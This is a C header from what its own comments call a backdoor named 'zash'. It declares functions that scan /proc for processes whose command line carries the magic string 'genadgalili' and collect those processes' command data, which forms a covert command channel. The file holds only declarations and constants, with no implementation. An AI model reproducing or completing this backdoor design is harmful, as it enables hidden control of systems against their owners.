/**
 * @brief Internal header for scanner.c. This module scan for commands.
 * @aouther Z.F
 * @date 22/3/2020
 */

#ifndef ZASH_SCANNER_INTERNAL_H
#define ZASH_SCANNER_INTERNAL_H

/** Headers ***************************************************/
#include <stdbool.h>

#include "scanner.h"


/** Constants *************************************************/
/* The path of the directory contains information about process */
#define SCANNER_PROC_PATH "/proc"
/* The format to use to access the file contains a process command line*/
#define SCANNER_CMD_PATH_FORMAT "/proc/%d/cmdline"
/* The magic command name that tells the backdoor that a process represent a command */
#define SCANNER_REQUIRED_COMMAND "genadgalili"
/* The maximum size of a command line to scan. */
#define SCANNER_MAX_COMMAND_LINE_LENGTH (4096)


/** Macros *************************************************/
/* True is an status error is a fatal status and the scanning should stop. */
#define SCANNER_IS_FATAL_ERROR(status) ((ZASH_STATUS_SUCCESS != (status)) &&  \
(ZASH_STATUS_SCANNER_GET_COMMAND_LINE_NO_COMMAND_FILE != (status)) &&         \
(ZASH_STATUS_SCANNER_GET_COMMAND_ID_NO_PROCESS_EXIST != (status)) &&            \
(ZASH_STATUS_SCANNER_GET_COMMAND_LINE_NO_COMMAND_LINE != (status)))           \

/** Structs **************************************************/
/** @brief the context of a scanner object. */
struct SCANNER_context {
    /* the pids already scanned  */
    struct VECTOR_context *scanned_pids;
};

/** @brief an object to scan with and return data found. */
struct scanner_data_retriever {
    /* the scanner to scan with */
    struct SCANNER_context *context;
    /* the data found from scanning processes */
    struct VECTOR_context *data;
};



/** Functions *************************************************/
/**
 * @brief Check if a process was already scanned.
 *
 * @param [in]           pid                    the pid of the process to check.
 *
 * @param [in]           scanned_pids           the pids that was already scanned.
 *
 * @param [out]          is_scanned             true if the pid was already scanned.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status
scanner_is_scanned(pid_t pid, struct VECTOR_context *scanned_pids, bool *is_scanned);


/**
 * @brief Mark a process as scanned so it wont be scanned again.
 *
 * @param [in]           pid                    the pid of the process to mark as scanned
 *
 * @param [in,out]       scanned_pids           the pids that was already scanned.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_mark_as_scanned(int pid, struct VECTOR_context *scanned_pids);


/**
 * @brief Get the command line used for running a process.
 *
 * @param [in]           pid                    the pid of the process to extract it's data.
 *
 * @param [in, out]      command_line_len       the maximum length of a command line.
 *                                              return the command line actual length.
 *
 * @param [out]          command_line           the command line used to run the process. this
 *                                              parameter has the same syntax as the file
 *                                              /proc/[pid]/cmdline - each parameter will be
 *                                              separated form the next by a null terminator.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_get_command_line(int pid, size_t *command_line_len, char *command_line);


/**
 * @brief Check if a process has the magic command that mean its data is required by the scanner.
 *
 * @param [in]           command_path           the command used to run the process.
 *
 * @param [out]          is_required            true if the process is required by the scanner.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_is_required(const char *command_path, bool *is_required);


/**
 * @brief Get a SCANNER_data object contains all required data about a process.
 *
 * @param [in]           command_id                    the pid of the process to extract it's data.
 *
 * @param [in]           command_line           the command line used to run the process. this
 *                                              parameter has the same syntax as the file
 *                                              /proc/[pid]/cmdline - each parameter will be
 *                                              separated form the next by a null terminator.
 *
 * @param [in]           command_line_len       the length in bytes of the command_line parameter.
 *
 * @param [out]          data                   the extracted data about the process.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_data_create(int command_id,
                                     char *command_line,
                                     size_t command_line_len,
                                     struct SCANNER_data **data);


/**
 * @brief Scan for commands from a specific process.
 *
 * @param [in]           context                the scanner to scan me.
 *
 * @param [in]           pid                    the pid of the process to scan from.
 *
 * @param [out]          data                   the vector to add data found into.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status scanner_scan_data_from_process(struct SCANNER_context *context,
                                                pid_t pid,
                                                struct VECTOR_context *data);


/**
 * @brief Scan for commands from a file in /proc directory.
 *
 * @param [in]           dir                   unused.
 *
 * @param [in]           file                  the name of the file.
 *
 * @param [in]           retriever             the data retriever, contains the scanner to scan with
 *                                             and the data vector to add data found into.
 *
 * @return               return value indicating an error may returned.
 *
 * @note                 This function is a callback for UTILS_iter_dir.
 *
 */
enum zash_status scanner_scan_data_from_file(const char *dir,
                                             const char *file,
                                             struct scanner_data_retriever *retriever);


#endif //ZASH_SCANNER_INTERNAL_H
